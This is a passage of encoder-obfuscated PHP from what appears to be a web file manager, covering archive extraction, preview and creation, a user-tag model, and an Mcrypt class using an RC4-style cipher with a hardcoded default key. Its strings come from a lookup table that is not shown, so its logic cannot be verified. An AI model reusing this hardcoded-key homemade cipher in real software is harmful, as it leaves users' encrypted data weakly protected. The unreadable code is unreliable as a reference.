c¡ƒ„¥Ÿ: } static function extractZipFile($E˜ôŒÛÒâù, $a²¿ºñ¤•, $BÑ‰’Œ…Î÷ = false) { goto eÃ…‹‹«îõ; Aà·¢²: mk_dir($Bë„ï¶«áï); $a•ò¢¸‚„µ = $Bë„ï¶«áï . md5($E˜ôŒÛÒâù . $a²¿ºñ¤•); if ($BÑ‰’Œ…Î÷) { $a•ò¢¸‚„µ = $Bë„ï¶«áï . $BÑ‰’Œ…Î÷; } goto E“ÊöÔùÖĞ; eÃ…‹‹«îõ: $b¥Ä‘±„×ƒ =& $_SERVER[÷ÖêïÔÔÓ]; self::init(); $Bë„ï¶«áï = TEMP_FILES . hash_path($E˜ôŒÛÒâù) . $b¥Ä‘±„×ƒ[8]; goto Aà·¢²; E“ÊöÔùÖĞ: if (file_exists($a•ò¢¸‚„µ)) { return $a•ò¢¸‚„µ; } $DÛä·³öø‰ = new PclZip($E˜ôŒÛÒâù); $bÖœÄ‡¢Ñ = unzip_filter_ext($Bë„ï¶«áï . get_path_this($a²¿ºñ¤•)); goto Bæ˜˜†­‹; Bæ˜˜†­‹: $FØöŠÇğøò = get_path_father($a²¿ºñ¤•); if ($FØöŠÇğøò == $a²¿ºñ¤•) { $FØöŠÇğøò = $b¥Ä‘±„×ƒ[33]; } $Eåø Ì´¡ = $DÛä·³öø‰->extract(PCLZIP_OPT_PATH, $Bë„ï¶«áï, PCLZIP_CB_PRE_FILE_NAME, $b¥Ä‘±„×ƒ[1825], PCLZIP_OPT_REMOVE_PATH, $FØöŠÇğøò, PCLZIP_OPT_BY_NAME, $a²¿ºñ¤•); goto a‚Ãò¨²¢Ï; a‚Ãò¨²¢Ï: if (!file_exists($bÖœÄ‡¢Ñ)) { return !1; } @rename($bÖœÄ‡¢Ñ, $a•ò¢¸‚„µ); return $a•ò¢¸‚„µ; goto B×ãäªçÏ§; B×ãäªçÏ§: } static function filePreview($e‘éŞ¯Û›Û, $FÛÁºë•µ¡, $e¯ƒŒ‘ğ = false, $EØ„ÚÚÁÉ = false) { goto b»òÃ´Å‰; F„¤“„°ÅÄ: $A¾”Èç‘òŸ = unzip_pre_name($A¾”Èç‘òŸ); $B¶ï‡¶ÏĞ½ = get_path_this($A¾”Èç‘òŸ); $CŠ–×à¤œ = unzip_filter_ext($a»…â¦·¼ . $B¶ï‡¶ÏĞ½); goto d÷§ˆ£¼‚Â; EˆœÅóö·: mk_dir($a»…â¦·¼); $dÀõ¬êˆÒÎ = $a»…â¦·¼ . md5($e‘éŞ¯Û›Û . $FÛÁºë•µ¡ . $EØ„ÚÚÁÉ); $A¾”Èç‘òŸ = $a‹³¶«Ôâˆ[33]; goto EˆÜã„™Ä©; d÷§ˆ£¼‚Â: if (!$C’šÍñõİ´[$a‹³¶«Ôâˆ[1006]]) { show_json($C’šÍñõİ´[$a‹³¶«Ôâˆ[1008]], !1); } if (!file_exists($CŠ–×à¤œ)) { show_json($a‹³¶«Ôâˆ[1829], !1); } @rename($CŠ–×à¤œ, $dÀõ¬êˆÒÎ); goto bÏÕ¯¼š¨¿; b»òÃ´Å‰: $a‹³¶«Ôâˆ =& $_SERVER[÷ÖêïÔÔÓ]; self::init(); $a»…â¦·¼ = TEMP_FILES . hash_path($e‘éŞ¯Û›Û) . $a‹³¶«Ôâˆ[8]; goto EˆœÅóö·; EˆÜã„™Ä©: $C’šÍñõİ´ = self::extract($e‘éŞ¯Û›Û, $a»…â¦·¼, $FÛÁºë•µ¡, $A¾”Èç‘òŸ); if (is_array($A¾”Èç‘òŸ)) { show_json($a‹³¶«Ôâˆ[1828], !1); } if (file_exists($dÀõ¬êˆÒÎ)) { IO::fileOut($dÀõ¬êˆÒÎ, $e¯ƒŒ‘ğ, get_path_this($A¾”Èç‘òŸ)); return; } goto F„¤“„°ÅÄ; bÏÕ¯¼š¨¿: if (!file_exists($dÀõ¬êˆÒÎ)) { del_dir($a»…â¦·¼); show_json($a‹³¶«Ôâˆ[1830]); } IO::fileOut($dÀõ¬êˆÒÎ, $e¯ƒŒ‘ğ, $B¶ï‡¶ÏĞ½); goto Fë›ÅÏ™¦Ô; Fë›ÅÏ™¦Ô: } static function create($cĞæ¤ñ§•¹, $A»„•§Îğæ) { $fÀÖ³¢Š¹÷ =& $_SERVER[÷ÖêïÔÔÓ]; self::init(); $A•˜†Ù¬É› = get_path_ext($cĞæ¤ñ§•¹); $dé»õÙ‰ = !1; if (self::checkIfType($A•˜†Ù¬É›, $fÀÖ³¢Š¹÷[298])) { if (kodZipArchive::support($fÀÖ³¢Š¹÷[983])) { return kodZipArchive::create($cĞæ¤ñ§•¹, $A»„•§Îğæ); } $b‰ùíÛ¤™… = new PclZip($cĞæ¤ñ§•¹); foreach ($A»„•§Îğæ as $DŸë¬—¦Æá => $BõÔ‘„¨¹™) { $BõÔ‘„¨¹™ = str_replace($fÀÖ³¢Š¹÷[463], $fÀÖ³¢Š¹÷[8], $BõÔ‘„¨¹™); $a¯«‡àí¦™ = Kodio::clear(get_path_father($BõÔ‘„¨¹™)); if ($DŸë¬—¦Æá == 0) { $dé»õÙ‰ = $b‰ùíÛ¤™…->create($BõÔ‘„¨¹™, PCLZIP_OPT_REMOVE_PATH, $a¯«‡àí¦™, PCLZIP_CB_PRE_FILE_NAME, $fÀÖ³¢Š¹÷[1831]); continue; } $dé»õÙ‰ = $b‰ùíÛ¤™…->add($BõÔ‘„¨¹™, PCLZIP_OPT_REMOVE_PATH, $a¯«‡àí¦™, PCLZIP_CB_PRE_FILE_NAME, $fÀÖ³¢Š¹÷[1831]); } } else { if (self::checkIfType($A•˜†Ù¬É›, $fÀÖ³¢Š¹÷[1800])) { foreach ($A»„•§Îğæ as $DŸë¬—¦Æá => $BõÔ‘„¨¹™) { $BõÔ‘„¨¹™ = str_replace($fÀÖ³¢Š¹÷[463], $fÀÖ³¢Š¹÷[8], $BõÔ‘„¨¹™); $a¯«‡àí¦™ = Kodio::clear(get_path_father($BõÔ‘„¨¹™)); if ($DŸë¬—¦Æá == 0) { $dé»õÙ‰ = PclTarCreate($cĞæ¤ñ§•¹, array($BõÔ‘„¨¹™), $A•˜†Ù¬É›, null, $a¯«‡àí¦™); continue; } $dé»õÙ‰ = PclTarAddList($cĞæ¤ñ§•¹, array($BõÔ‘„¨¹™), $fÀÖ³¢Š¹÷[33], $a¯«‡àí¦™, $A•˜†Ù¬É›); } } } return $dé»õÙ‰; } } class Mcrypt { public static $defaultKey = "\141\x21\x74\x61\153\101\72\144\154\155\x63\154\144\105\166\x2c\145"; public static function encode($EŠ¡¢áÓ, $cªëÕê˜¯Ú = '', $Fã‹–µÎ„ = 0, $F‚ÍÈÀœò = '') { goto CÏ¨ó™ËÖÇ; f”ÅÑ¸š»†: $EŠ¡¢áÓ = sprintf($b´ï’ó„äÀ[1832], $Fã‹–µÎ„ ? $Fã‹–µÎ„ + time() : 0) . substr(md5($EŠ¡¢áÓ . $dòÃ‘²ğ˜–), 0, 16) . $EŠ¡¢áÓ; $e÷æŞëÒ  = strlen($EŠ¡¢áÓ); $fÊí‚¤™Æ = array(); goto A¢Ö£ƒ‰‚°; A¢Ö£ƒ‰‚°: for ($a˜¤îƒ²±Ù = 0; $a˜¤îƒ²±Ù <= 255; $a˜¤îƒ²±Ù++) { $fÊí‚¤™Æ[$a˜¤îƒ²±Ù] = ord($FÆäìÂñë[$a˜¤îƒ²±Ù % $b¨³Ñ¼Œ¯²]); } $eÓù–æ„ä¥ = range(0, 255); for ($BËÄï§°§ = $a˜¤îƒ²±Ù = 0; $a˜¤îƒ²±Ù < 256; $a˜¤îƒ²±Ù++) { $BËÄï§°§ = ($BËÄï§°§ + $eÓù–æ„ä¥[$a˜¤îƒ²±Ù] + $fÊí‚¤™Æ[$a˜¤îƒ²±Ù]) % 256; $Bêêè¨éÛñ = $eÓù–æ„ä¥[$a˜¤îƒ²±Ù]; $eÓù–æ„ä¥[$a˜¤îƒ²±Ù] = $eÓù–æ„ä¥[$BËÄï§°§]; $eÓù–æ„ä¥[$BËÄï§°§] = $Bêêè¨éÛñ; } goto aß‹µ±ÏŸô; f‘¹Åªò°ê: $B¾†‰Ûï = str_replace(array($b´ï’ó„äÀ[281], $b´ï’ó„äÀ[8], $b´ï’ó„äÀ[903]), array($b´ï’ó„äÀ[408], $b´ï’ó„äÀ[71], $b´ï’ó„äÀ[92]), $B¾†‰Ûï); return $B¾†‰Ûï; goto d¤Æì±î­„; C„ªªçÃ: $B‡‚Œøƒ = substr($F‚ÍÈÀœò, -$e‹¹»‚îÁ); $FÆäìÂñë = $A®Â†Ğ„ğÆ . md5($A®Â†Ğ„ğÆ . $B‡‚Œøƒ); $b¨³Ñ¼Œ¯² = strlen($FÆäìÂñë); goto f”ÅÑ¸š»†; aß‹µ±ÏŸô: $B¾†‰Ûï = $b´ï’ó„äÀ[33]; for ($AÕÎŠäøÖï = $BËÄï§°§ = $a˜¤îƒ²±Ù = 0; $a˜¤îƒ²±Ù < $e÷æŞëÒ ; $a˜¤îƒ²±Ù++) { $AÕÎŠäøÖï = ($AÕÎŠäøÖï + 1) % 256; $BËÄï§°§ = ($BËÄï§°§ + $eÓù–æ„ä¥[$AÕÎŠäøÖï]) % 256; $Bêêè¨éÛñ = $eÓù–æ„ä¥[$AÕÎŠäøÖï]; $eÓù–æ„ä¥[$AÕÎŠäøÖï] = $eÓù–æ„ä¥[$BËÄï§°§]; $eÓù–æ„ä¥[$BËÄï§°§] = $Bêêè¨éÛñ; $B¾†‰Ûï .= chr(ord($EŠ¡¢áÓ[$a˜¤îƒ²±Ù]) ^ $eÓù–æ„ä¥[($eÓù–æ„ä¥[$AÕÎŠäøÖï] + $eÓù–æ„ä¥[$BËÄï§°§]) % 256]); } $B¾†‰Ûï = $B‡‚Œøƒ . str_replace($b´ï’ó„äÀ[903], $b´ï’ó„äÀ[33], base64_encode($B¾†‰Ûï)); goto f‘¹Åªò°ê; B¹†¨ ÚÁë: $A®Â†Ğ„ğÆ = md5(substr($cªëÕê˜¯Ú, 0, 16)); $dòÃ‘²ğ˜– = md5(substr($cªëÕê˜¯Ú, 16, 16)); $F‚ÍÈÀœò = $F‚ÍÈÀœò ? $F‚ÍÈÀœò : md5(microtime()); goto C„ªªçÃ; CÏ¨ó™ËÖÇ: $b´ï’ó„äÀ =& $_SERVER[÷ÖêïÔÔÓ]; $e‹¹»‚îÁ = 4; $cªëÕê˜¯Ú = md5($cªëÕê˜¯Ú ? $cªëÕê˜¯Ú : self::$defaultKey); goto B¹†¨ ÚÁë; d¤Æì±î­„: } public static function decode($E“‚ºÅ™©›, $BÀÀ“˜´Ñö = '') { goto fò°ÜË¥¶¹; Cˆ£ƒ‰ƒ¦ô: $BÀÀ“˜´Ñö = md5($BÀÀ“˜´Ñö ? $BÀÀ“˜´Ñö : self::$defaultKey); $Ağœ–ĞÑ = md5(substr($BÀÀ“˜´Ñö, 0, 16)); $fğõÃÜ®æ = md5(substr($BÀÀ“˜´Ñö, 16, 16)); goto cì»¬÷½†; fò°ÜË¥¶¹: $fåìµÆÖÑÃ =& $_SERVER[÷ÖêïÔÔÓ]; $E“‚ºÅ™©› = str_replace(array($fåìµÆÖÑÃ[408], $fåìµÆÖÑÃ[71], $fåìµÆÖÑÃ[92]), array($fåìµÆÖÑÃ[281], $fåìµÆÖÑÃ[8], $fåìµÆÖÑÃ[903]), $E“‚ºÅ™©›); $d“³¤©¥¹Ò = 4; goto Cˆ£ƒ‰ƒ¦ô; E‚ÙÕ¨§‡: $E“‚ºÅ™©› = base64_decode(substr($E“‚ºÅ™©›, $d“³¤©¥¹Ò)); $cÇãï‰Ñ«¿ = strlen($E“‚ºÅ™©›); $Cç ÷ø¶Ç = array(); goto Fáˆ¾³ìÃ; E–òÔƒĞ¬: $c‚÷ßå³¢ = $fåìµÆÖÑÃ[33]; for ($d·ÃßÉÄ­ğ = $cƒ‰®ÚÁ = $f‰ƒµô™ = 0; $f‰ƒµô™ < $cÇãï‰Ñ«¿; $f‰ƒµô™++) { $d·ÃßÉÄ­ğ = ($d·ÃßÉÄ­ğ + 1) % 256; $cƒ‰®ÚÁ = ($cƒ‰®ÚÁ + $B²¤´äÁ¶”[$d·ÃßÉÄ­ğ]) % 256; $AòÏ·„ßì× = $B²¤´äÁ¶”[$d·ÃßÉÄ­ğ]; $B²¤´äÁ¶”[$d·ÃßÉÄ­ğ] = $B²¤´äÁ¶”[$cƒ‰®ÚÁ]; $B²¤´äÁ¶”[$cƒ‰®ÚÁ] = $AòÏ·„ßì×; $c‚÷ßå³¢ .= chr(ord($E“‚ºÅ™©›[$f‰ƒµô™]) ^ $B²¤´äÁ¶”[($B²¤´äÁ¶”[$d·ÃßÉÄ­ğ] + $B²¤´äÁ¶”[$cƒ‰®ÚÁ]) % 256]); } if ((substr($c‚÷ßå³¢, 0, 10) == 0 || substr($c‚÷ßå³¢, 0, 10) - time() > 0) && substr($c‚÷ßå³¢, 10, 16) == substr(md5(substr($c‚÷ßå³¢, 26) . $fğõÃÜ®æ), 0, 16)) { return substr($c‚÷ßå³¢, 26); } else { return $fåìµÆÖÑÃ[33]; } goto e¢‚Ğ›Ç·‚; Fáˆ¾³ìÃ: for ($f‰ƒµô™ = 0; $f‰ƒµô™ <= 255; $f‰ƒµô™++) { $Cç ÷ø¶Ç[$f‰ƒµô™] = ord($eö¶ÙŒ£ÓÙ[$f‰ƒµô™ % $eÏÄÖ±†ˆ]); } $B²¤´äÁ¶” = range(0, 255); for ($cƒ‰®ÚÁ = $f‰ƒµô™ = 0; $f‰ƒµô™ < 256; $f‰ƒµô™++) { $cƒ‰®ÚÁ = ($cƒ‰®ÚÁ + $B²¤´äÁ¶”[$f‰ƒµô™] + $Cç ÷ø¶Ç[$f‰ƒµô™]) % 256; $AòÏ·„ßì× = $B²¤´äÁ¶”[$f‰ƒµô™]; $B²¤´äÁ¶”[$f‰ƒµô™] = $B²¤´äÁ¶”[$cƒ‰®ÚÁ]; $B²¤´äÁ¶”[$cƒ‰®ÚÁ] = $AòÏ·„ßì×; } goto E–òÔƒĞ¬; cì»¬÷½†: $CÃœ•ÇöİØ = substr($E“‚ºÅ™©›, 0, $d“³¤©¥¹Ò); $eö¶ÙŒ£ÓÙ = $Ağœ–ĞÑ . md5($Ağœ–ĞÑ . $CÃœ•ÇöİØ); $eÏÄÖ±†ˆ = strlen($eö¶ÙŒ£ÓÙ); goto E‚ÙÕ¨§‡; e¢‚Ğ›Ç·‚: } } goto E»ÑİóÄ; aÜ©Ö“ì: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($aİ„”ñÎé) { $a¡Ó®¥İ°¤ =& $_SERVER[÷ÖêïÔÔÓ]; return array($a¡Ó®¥İ°¤[2358] => array(USER_ID, $a¡Ó®¥İ°¤[2416])); } protected function listData() { $dóºŒ±°Ã =& $_SERVER[÷ÖêïÔÔÓ]; $Aª’ÚƒÉˆÈ = array($dóºŒ±°Ã[1332] => USER_ID, $dóºŒ±°Ã[432] => array($dóºŒ±°Ã[2417], 0)); $Fƒ®µ×•“¨ = $dóºŒ±°Ã[2418]; $aÄ÷´ËœõŸ = $dóºŒ±°Ã[2419]; $e“°İÛ…‹È = $this->field($Fƒ®µ×•“¨)->where($Aª’ÚƒÉˆÈ)->order($aÄ÷´ËœõŸ)->select(); return $e“°İÛ…‹È ? $e“°İÛ…‹È : array(); } protected function listByTag($bñ½™ÄÊÛ) { } protected function addToTag($EŞÈÔƒ‰øë, $a‡Üßèç‰) { $EŠ°™ˆİÛ =& $_SERVER[÷ÖêïÔÔÓ]; if (!Model($EŠ°™ˆİÛ[2204])->listData($a‡Üßèç‰) || !Model($EŠ°™ˆİÛ[748])->pathInfo($EŞÈÔƒ‰øë)) { return !1; } $b””ƒ¿ì£å = array($EŠ°™ˆİÛ[1332] => USER_ID, $EŠ°™ˆİÛ[432] => $a‡Üßèç‰, $EŠ°™ˆİÛ[384] => $EŞÈÔƒ‰øë, $EŠ°™ˆİÛ[385] => $EŠ°™ˆİÛ[379], $EŠ°™ˆİÛ[383] => $EŠ°™ˆİÛ[33], $EŠ°™ˆİÛ[2008] => 0); if ($this->where($b””ƒ¿ì£å)->find()) { return !1; } return $this->add($b””ƒ¿ì£å); } protected function removeFromTag($dã±Ê…”¿, $C„Â¾íÖ¨Œ) { $f·²¿™©Š =& $_SERVER[÷ÖêïÔÔÓ]; if (!Model($f·²¿™©Š[2204])->listData($C„Â¾íÖ¨Œ) || !Model($f·²¿™©Š[748])->pathInfo($dã±Ê…”¿)) { return !1; } $aÆ®óÏ¶œ¾ = array($f·²¿™©Š[1332] => USER_ID, $f·²¿™©Š[432] => $C„Â¾íÖ¨Œ, $f·²¿™©Š[385] => $f·²¿™©Š[379], $f·²¿™©Š[384] => $dã±Ê…”¿); return $this->where($aÆ®óÏ¶œ¾)->delete(); } protected function removeByTag($D‰´‹¥ñ×Õ) { $dµŒÒÕœ˜ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$D‰´‹¥ñ×Õ) { return !1; } $aÏˆÖ¬Çà« = array($dµŒÒÕœ˜[1332] => USER_ID, $dµŒÒÕœ˜[432] => $D‰´‹¥ñ×Õ); return $this->where($aÏˆÖ¬Çà«)->delete(); } protected function removeBySource($cš†–öù) { $Bîµó ãØÌ =& $_SERVER[÷ÖêïÔÔÓ]; $f¢ù‡Æ¦ = array($Bîµó ãØÌ[1332] => USER_ID, $Bîµó ãØÌ[384] => $cš†–öù, $Bîµó ãØÌ[432] => array($Bîµó ãØÌ[924], 0)); return $this->where($f¢ù‡Æ¦)->delete(); } }